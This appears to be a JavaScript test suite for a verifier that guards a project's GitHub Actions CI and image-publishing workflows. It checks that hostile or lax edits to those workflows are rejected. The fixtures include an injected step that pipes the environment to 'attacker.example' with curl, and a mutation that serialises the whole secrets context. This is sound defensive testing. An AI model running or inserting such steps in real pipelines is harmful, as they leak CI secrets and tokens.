import { strict as assert } from 'node:assert';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import { verifySafeAppBackendWorkflows } from './verify-safe-app-backend-workflows.mjs';

const ciSource = readFileSync('.github/workflows/safe-app-backend.yml', 'utf8');
const publishSource = readFileSync(
  '.github/workflows/safe-app-backend-publish.yml',
  'utf8'
);

function verify(
  publishMutation = (source) => source,
  ciMutation = (source) => source
) {
  verifySafeAppBackendWorkflows({
    ciSource: ciMutation(ciSource),
    publishSource: publishMutation(publishSource),
  });
}

test('accepts the reviewed split workflow policy', () => {
  assert.doesNotThrow(() => verify());
});

test('rejects manual publication', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace('on:\n  push:', 'on:\n  workflow_dispatch:\n  push:')
    )
  );
});

test('rejects a fail-open activation variable', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace(
        "vars.CANNON_SAFE_PUBLISH_ENABLED == 'true'",
        "vars.CANNON_SAFE_PUBLISH_ENABLED != 'false'"
      )
    )
  );
});

test('rejects publication without the protected environment', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace('    environment: cannon-image-publish\n', '')
    )
  );
});

test('rejects a pull request publisher trigger', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace('on:\n  push:', 'on:\n  pull_request:\n  push:')
    )
  );
});

test('rejects write access in pull request CI', () => {
  assert.throws(() =>
    verify(
      (source) => source,
      (source) =>
        source.replace(
          'permissions:\n  contents: read',
          'permissions:\n  contents: write'
        )
    )
  );
});

test('rejects additional publisher permissions', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace(
        '      packages: write\n',
        '      packages: write\n      issues: write\n'
      )
    )
  );
});

test('rejects computed GitHub contexts in the publisher', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace(
        '${{ env.IMAGE_NAME }}:${{ github.sha }}',
        "${{ env.IMAGE_NAME }}:${{ github['sha'] }}"
      )
    )
  );
});

test('rejects a different pinned publisher action', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace(
        'docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c',
        'docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130'
      )
    )
  );
});

test('rejects a mutable publisher image tag', () => {
  assert.throws(() =>
    verify((source) =>
      source.replace(
        '${{ env.IMAGE_NAME }}:${{ github.sha }}',
        '${{ env.IMAGE_NAME }}:latest'
      )
    )
  );
});

test('rejects a different registry endpoint', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace(
          '          registry: ghcr.io',
          '          registry: r.example'
        )
      ),
    /exact reviewed schema/
  );
});

test('rejects a different image destination', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace(
          'IMAGE_NAME: ghcr.io/reya-labs/safe-app-backend',
          'IMAGE_NAME: ghcr.io/attacker/safe-app-backend'
        )
      ),
    /exact reviewed schema/
  );
});

test('rejects an arbitrary publisher run step', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace(
          '      - uses: docker/setup-buildx-action@',
          '      - run: env | curl --data-binary @- https://attacker.example\n' +
            '      - uses: docker/setup-buildx-action@'
        )
      ),
    /exact reviewed schema/
  );
});

test('rejects a whole secrets context', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace('${{ secrets.GITHUB_TOKEN }}', '${{ secrets }}')
      ),
    /whole or computed secrets contexts/
  );
});

test('rejects toJSON of the whole secrets context', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace('${{ secrets.GITHUB_TOKEN }}', '${{ toJSON(secrets) }}')
      ),
    /whole or computed secrets contexts/
  );
});

test('rejects an unreviewed build context', () => {
  assert.throws(
    () =>
      verify((source) =>
        source.replace(
          '          context: ./packages/safe-app-backend',
          '          context: .'
        )
      ),
    /exact reviewed schema/
  );
});
